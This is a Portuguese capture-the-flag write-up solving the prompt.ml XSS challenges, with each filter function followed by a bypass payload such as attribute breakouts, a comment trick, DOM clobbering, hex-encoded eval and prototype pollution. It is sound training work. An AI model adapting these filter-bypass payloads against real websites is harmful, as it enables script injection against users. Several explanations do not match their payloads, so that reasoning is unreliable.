# Write-up: Desafios XSS em prompt.ml

> Resolvido por **@Cubano2**

---

## Introdução

Este documento apresenta uma análise técnica dos desafios de XSS disponíveis em [prompt.ml](https://prompt.ml/0). Cada nível aplica um mecanismo distinto de filtragem/escape de entrada e requer uma técnica específica de bypass. Os testes foram realizados em **Microsoft Edge** e **Mozilla Firefox**.

---

## Ambiente e Ferramentas

- **Navegadores**: Microsoft Edge, Mozilla Firefox  
- **Ferramentas**: DevTools (Console, Network), proxies HTTP (opcional)

---

## Metodologia

1. **Inspeção do filtro** – Identificar expressões regulares ou transformações aplicadas ao `input`.  
2. **Construção do payload** – Dividir e codificar trechos para contornar cada restrição.  
3. **Teste e refinamento** – Ajustar o payload até que o script seja executado automaticamente.

## level 0
```Js
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}        
```
Filtro: nenhum (concatenação direta no atributo value).
Resposta: `"><script>prompt(1)</script>`


## level 1
```javascript
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}        
```
Filtro: remoção de <…> ou </…> via regex.
Respota: ```<img src=1 onerror='prompt(1)'```

Usamos o elemento <img> com atributo onerror, que não é capturado pela regex de remoção de tags.

## level 2
```javascript
 Text Viewer
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        
```
filtro: remoção de = e (.
Resposta: ```<svg><script>prompt&#40;1)</script>```

Para contornar o filtro que remove `=` e `()`, usamos a entidade HTML ```&#40;``` no lugar do parêntese e evitamos o sinal de igual.

## level 3
```javascript
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}            
```
Filtro: substitui -> por _, impedindo o término de comentário -->.
Resposta: ```--!><svg/onload=prompt(1)```

Para contornar o filtro (que remove ->), usamos o fechamento alternativo de comentário --!> definido no HTML5, fechamos o comentário e em seguida executamos o vetor SVG.


## level 5
```javascript
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}                   
```
Filtro: remove >, qualquer atributo on...= e a palavra focus.
Resposta ```"type=image src onerror
="prompt(1) ```

Utilizamos quebras de linha para separar atributos, encerrando `value="` e injetando `type="image"`, `src vazio` e `onerror="prompt(1)"` em linhas distintas.


## level 6
```javascript
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}                         
```
Filtro: bloqueia URIs `javascript:`, `vbscript:`, `data:` em `action`.
Resposta:  ```javascript:prompt(1)#{"action":1}```

Usamos a técnica de DOM clobbering: ao passar `{"action":1}` via JSON, criamos um `<input name="action">`, sobrescrevendo `form.action` para algo seguro que passe no teste e dispare `prompt(1)`.

## level 7
```javascript
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}       
```
Filtro: Divide em segmentos por `#`, limita cada segmento a 12 caracteres e envolve em `<p title="…">`.

Resposta: `"><svg/a=#"onload='/*#*/prompt(1)'`

Primeiro segmento: `">` fecha o `title` e a tag `<p>`. Segundo segmento: inicia atributo `a=` e abre `onload='/*`. Terceiro segmento: fecha comentário `*/` e chama `prompt(1)`.



## level 8
```javascript
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '                                \n\
<script>                                    \n\
    // console.log("' + input + '");        \n\
</script> ';
}        
```
Filtro: remove quebras de linha, `<`, `/`, `"`.

Resposta: ` prompt(1) -->`

Inserimos um espaço antes de prompt(1) e usamos --> para encerrar o comentário JS, liberando a chamada a console.log (ou prompt, se ajustado).


## level 9
```javascript
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}       
```

Filtro: Substitui `<X` por `<_X`. Converte todos os caracteres para MAIÚSCULAS.

Resposta: `<ſcript/src=http://localhost:8000/test.js></ſcript>`

Neste nível, podemos observar que a entrada do usuário é tratada por “_” e também é feita a conversão de minúsculas para maiúsculas. Para contornar isso, podemos criar um payload utilizando alguns caracteres UNICODE da internet e, além disso, precisamos criar um arquivo JavaScript contendo o texto `prompt(1)`. Com isso só colocar no site a resposta desse level que conseguimos passar de nível.

![image](https://github.com/user-attachments/assets/dc13ddf5-82c6-4c8a-87fe-e57a00362141)

## level A
```javascript
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}
```

Filtro: `encodeURIComponent` + troca de `prompt` por `alert`. Remove aspas simples `'`.

Resposta: `p'rompt(1)`

O nível A (10) é um dos mais fáceis de resolver neste desafio. Existem duas expressões regulares a serem contornadas: a primeira remove todas as ocorrências da palavra-chave `prompt`, enquanto a segunda remove todas as aspas simples `'`. Para contornar a primeira expressão regular, basta usar uma aspa simples para dividir a palavra-chave `prompt` em `pr'ompt`, o que claramente não é uma instrução JavaScript válida. Mas não se preocupe, a segunda expressão regular removerá o caractere invasor `'`, retornando um vetor de ataque válido!

## level B
```javascript
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}
```
Filtro: proíbe caracteres especiais `em memberName`.

Resposta: `"(prompt(1))in"`

Usamos o operador alfanumérico `in` como parte do payload para injetar uma expressão válida em JavaScript sem usar símbolos proibidos.


## level C
```javascript
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}        
```
Filtro: `encodeURIComponent` + troca de `prompt` por `alert`.

Resposta: `eval(0x258da033.toString(30))(1)`

O nível C (12) tem um novo nível de dificuldade por conta do `encodeURIComponent` pois essa função faz com que caracteres como `/ ?` e outros que sejam condificados com URL e impossibilitando usarmos payloads que usamos nos níveis anteriores. Porém um jeito de contornar isso é simplesmente escrever o payload em outra base, como por exemplo hexadecimal. Por conta disso temos que usar `0x258da033.toString` onde `0x258da033` passado pra string fica `prompt` e assim burlando o filtro do level, fazendo a função `eval` chamar prompt por meio da base em hexadecimal e no final adicionar o `(1)`.

## level D
```javascript
 function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}
```
Filtro: Remove `source` inválido. Strip de aspas em `config.source`.

Resposta ```{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}```
 
Nesse nível devemos enviar um JSON com um source propositalmente inválido e um outro dentro de `__proto__`. O filtro remove o source inválido, sobrando só o do protótipo. Usa o poder de herança pra “injetar” código onde antes só era permitido texto simples. Finalmente, engana o .replace(/"/g,'') usando o $`` do replace, montando um onerror` sem precisar de aspas.




## level F
```javascript
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}
```
Filtro: remove `*`, segmenta a entrada por `#` e limita cada título a 15 caracteres.

Resposta: `"><script>#${prompt(1)}#</script>`

Neste nivel temos que dividir o payload em pedaços separados por #, cada pedaço vira um <p> com atributo title. O primeiro pedaço (">) fecha o <p>, liberando o resto do texto para inserir tags de verdade. Os comentários HTML dentro de <svg> e <script> servem para “esconder” os atributos gerados automaticamente, garantindo que apenas o prompt(1) seja executado.
